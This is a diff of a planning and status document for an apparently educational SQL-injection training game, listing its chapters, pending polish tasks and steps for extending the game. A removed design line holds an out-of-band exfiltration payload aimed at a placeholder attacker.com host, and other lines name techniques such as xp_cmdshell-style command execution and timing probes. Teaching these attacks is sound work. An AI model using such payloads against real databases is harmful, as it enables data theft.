@@ -145,7 +145,7 @@ Each chapter is independently shippable.
 
 ---
 
-## 11. Build Status — Session Handoff (as of 2026-04-24)
+## 11. Build Status — All Chapters + Boss Shipped (last update 2026-04-26)
 
 ### ✅ Done
 
@@ -167,33 +167,37 @@ Each chapter is independently shippable.
 | **Chapter 1: Auth Bypass** | ✅ | 5 levels (Wooden Door, Iron Gate, Rune Lock, Silent Guard, Captain's Cipher) + sandbox generator. |
 | **Chapter 2: Error-Based** | ✅ | 5 levels (Loose Tongue, Extracted Truth, XML Trick, Cast of Lies, Hash Exposed) + sandbox. |
 | **Chapter 3: UNION-Based** | ✅ | 5 levels (Count the Pillars, Where the Text Sits, Name of the Realm, Atlas, Dump) + sandbox. |
+| **Chapter 4: Boolean-Based Blind** | ✅ | 5 levels (Coin Flip, Single Letter, Binary Search, Table Name, Hash One Bit) + sandbox. Binary-search bisection taught explicitly. |
+| **Chapter 5: Time-Based Blind** | ✅ | 5 levels (Heartbeat, Conditional Wait, Slow Letter, Heavy Computation, Patient Extraction) + sandbox covering MySQL/Postgres/MSSQL dialects. |
+| **Chapter 6: Stacked Queries** | ✅ | 5 levels (Two for One, New Admin, Burning the Logs, Privilege Escalation, Clean Heist) + sandbox. Driver `multipleStatements` flag taught. |
+| **Chapter 7: Second-Order** | ✅ | 5 levels (Sown Field, Detonation, Newsletter, Slow Burn, Sleeper Agent) + sandbox. Plant-then-detonate pattern. |
+| **Chapter 8: Out-of-Band** | ✅ | 5 levels (Whisper Channel, DNS Smuggling, HTTP Beacon, File Drop, Quiet Exfil) + sandbox. UNC + DNS + http extension + COPY ... PROGRAM. |
+| **Chapter 9: NoSQL (Bonus)** | ✅ | 5 levels (Operator, Lazy Probe, Server-Side Script, Aggregation, Type Confusion) + sandbox. Mongo `$ne`/`$regex`/`$where`/`$lookup`/`$set`. |
+| **Chapter 10: Boss — The Archon's Vault** | ✅ | Single-node final encounter requiring ≥3 chained disciplines (UNION + blind + time + OOB + stacked + error-based). 50 XP, victory copy, Total Defense card. |
+| Map: single-node chapter support | ✅ | `nodeCount` chapter property; boss renders one ankh node ☥ labeled "THE ARCHON". |
+| Nav link rename | ✅ | `index.html`, `neural-heatmap.html`, `tutorial-aws.html`, `tutorial-neural.html` now link to "SQLi Dungeon". |
 
-### 🔨 Remaining
+### 🔨 Optional polish remaining
 
-| Area | Priority | Notes for next session |
+| Area | Priority | Notes |
 |---|---|---|
-| **Chapter 4: Boolean-Based Blind** | Next | 5 levels. Idea progression: detect true/false response shape → infer single char via `SUBSTRING`+`ASCII` → extract DB name → extract table name → extract admin password char-by-char. Sandbox: random char target. Teach binary search as the optimization. |
-| **Chapter 5: Time-Based Blind** | High | Same arc but with `SLEEP(n)` / `WAITFOR DELAY`. Simulate "response took >3s" in the engine — just pattern-match for `SLEEP` / `pg_sleep` / `WAITFOR` with a numeric arg. Introduce Insight rolls for blind-inference accuracy. |
-| **Chapter 6: Stacked Queries** | Med | `;` separated statements. Require the game to model different DBs — MSSQL/Postgres allow stacking, MySQL often doesn't. Levels: drop a table, insert admin row, disable audit trigger, call `xp_cmdshell`-style fake RCE, clean up. |
-| **Chapter 7: Second-Order** | Med | Two-step: Stage 1 store payload (e.g., signup form), Stage 2 trigger it later (profile page re-queries with stored value, unsanitized). Engine needs a "stored payload" slot that a later level reads. Easiest: two phases inside one level, or two linked levels. |
-| **Chapter 8: Out-of-Band (OOB)** | Med | Simulate DNS/HTTP exfil. Payloads like `LOAD_FILE(CONCAT('\\\\\\\\',(SELECT…),'.attacker.com'))`. Engine just needs to pattern-match for OOB functions + a subquery. Narrate "your Burp Collaborator lights up." |
-| **NoSQL bonus** | Low | MongoDB-style `{ $ne: null }`, `$gt`/`$where`, JS injection in `$where`. Endpoint input is JSON, so payload builder should allow raw JSON. |
-| **Boss dungeon** | Low | Multi-class. One encounter requiring chained techniques (e.g., UNION to find column, Boolean blind to find admin id, Time-based to confirm hash). State tracks sub-goals. |
-| **Sprite art** | Low | User approved. Small pixel sprites per vuln class (spider/ghost/dragon/etc.) on nodes. Inline SVG or PNG base64 — keep single-file. |
-| **Nav link update** | Polish | `index.html` + `neural-heatmap.html` + `tutorial-*.html` reference "Attack Surface" — rename to "SQLi Dungeon" in their nav bars. |
-| **Asset extraction** | Polish | If `aws-attack-surface.html` grows past ~3000 lines, pull `CHAPTERS` into `assets/sqli-levels.js` and `<script src>`-include it. Not needed yet. |
+| Sprite art | Low | User approved earlier. Currently each chapter uses a unicode glyph + color. Real SVG/pixel sprites per vuln class (spider/ghost/dragon/etc.) on nodes are a future polish. Keep them inline so the file stays single-deploy. |
+| Asset extraction | Low | `aws-attack-surface.html` is now ~2200 lines. If it grows past ~3000 (e.g., adding sprites/animations), pull `CHAPTERS` into `assets/sqli-levels.js` and `<script src>` it. Not needed yet. |
+| Tutorial page for the dungeon | Low | `tutorial-sqli.html` — explainer/lore page intro to game mechanics. Currently the prologue copy in the game does this minimally. |
+| Audio | Low | Optional. Key-press click on Cast, low chime on Defense Card open, gold flourish on boss kill. |
+| Difficulty tiers | Low | Add per-level DC modifiers (Stealth/Insight DC scales with chapter). The hooks exist; values are flat. |
+| Leaderboard for sandbox | Stretch | Requires backend or third-party service. Out of scope for static-page deploy. |
+| Stronger payload validators | Polish | Some `check()` regexes are permissive (reward creative solutions). Tighten if false-positives become a teaching problem. |
 
-### 🧭 How to Continue (for the next Claude session)
+### 🧭 How to Extend (now that the core game ships end-to-end)
 
-1. **Open**: `C:\Users\mercu\Claude\neural-heatmap\aws-attack-surface.html`.
-2. **Find the anchor**: search for `// Chapters 4 – 8 + NoSQL bonus still to author`. That's exactly where new chapter entries go inside the `CHAPTERS` object.
-3. **Author pattern**: every chapter object needs `{ id, name, class, intro, levels: { 1..5 }, sandbox(seed) }`. Every level needs `{ id, name, endpoint, query, field, goal, reconNotes[], hints[], check(payload)→{ok, narrate}, unlockTokens[], defense: { title, body, code, tip } }`. Use Chapters 1–3 as templates.
-4. **`check(payload)` rules**: return `{ ok: true, narrate }` for full success, `{ ok: 'partial', narrate }` for credit-but-messy, `{ ok: false, narrate }` for failure. The engine already handles XP, defense card, phase routing.
-5. **Tokens**: add new tokens to the `KNOWN_TOKENS` array near the top of the script, then reference them in `unlockTokens` per level. They appear locked until a level unlocks them.
-6. **Commit cadence**: one chapter per commit; push after each. Commit messages have been `"Chapter N: Topic (5 levels + sandbox)"`.
-7. **Testing locally**: just open `aws-attack-surface.html` in a browser. No build step. localStorage persists progress — clear it via DevTools if you want a fresh run.
-8. **If levels grow too heavy**: extract `CHAPTERS` to `assets/sqli-levels.js` and `<script src="assets/sqli-levels.js"></script>` *before* the main script. Don't do this prematurely.
-9. **DO NOT** rewrite scaffold, theme, or engine — they are settled. Only add to `CHAPTERS` and polish.
+1. **Run it**: open `aws-attack-surface.html` in a browser. No build step. localStorage persists progress; clear it via DevTools `Application → Local Storage → sqli-dungeon.save.v1` for a fresh run.
+2. **Add a chapter**: insert a new entry in the `CHAPTERS` object. Pattern: `{ id, name, class, intro, levels: { 1..5 }, sandbox(seed) }`. Use Chapters 1–9 as templates.
+3. **Add a level**: every level needs `{ id, name, endpoint, query, field, goal, reconNotes[], hints[], check(payload)→{ok, narrate}, unlockTokens[], defense: { title, body, code, tip } }`. `check()` returns `{ ok: true|'partial'|false, narrate }`.
+4. **Add a special boss-style chapter**: set `nodeCount: 1` on the chapter object and `isBoss: true` on the level. Map renderer auto-handles single-node layout and the ☥ glyph.
+5. **Tokens**: append to `KNOWN_TOKENS`, then reference in `unlockTokens`. Locked until a level unlocks them.
+6. **Commit cadence**: one chapter per commit. Existing pattern: `"Chapter N: Topic (5 levels + sandbox)"`.
+7. **DO NOT** rewrite scaffold, theme, or engine without reason — they are settled.
 
 ### 🐛 Known limitations
 
